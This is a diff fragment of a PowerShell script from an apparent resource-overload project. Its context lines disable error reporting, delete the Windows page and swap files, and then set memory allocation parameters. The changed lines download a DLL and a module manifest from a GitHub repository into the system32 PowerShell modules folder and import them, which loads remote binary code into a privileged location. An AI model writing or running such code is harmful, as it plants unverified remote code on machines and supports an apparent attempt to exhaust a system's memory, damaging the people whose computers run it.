@@ -144,11 +144,16 @@ Set-Service "WerSvc" -StartupType Disabled
 Remove-Item -Path "C:\pagefile.sys" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\swapfile.sys" -Force -ErrorAction SilentlyContinue
 
-Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
-#Install-Module -Name PowerShellGet -Force -AllowClobber -Confirm:$false
-#Install-Module -Name PackageManagement -Force -AllowClobber -Confirm:$false
-Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 
-Import-Module ThreadJob -Force
+$moduleDir = "$env:windir\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.ThreadJob\2.2.0"
+
+if(-not(Test-Path -Path $moduleDir -PathType Container)){
+    New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null
+}
+
+iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
+iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\ThreadJob.dll"
+
+Import-Module Microsoft.PowerShell.ThreadJob -Force
 
 # --- Memory Allocation Parameters ---
 $physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
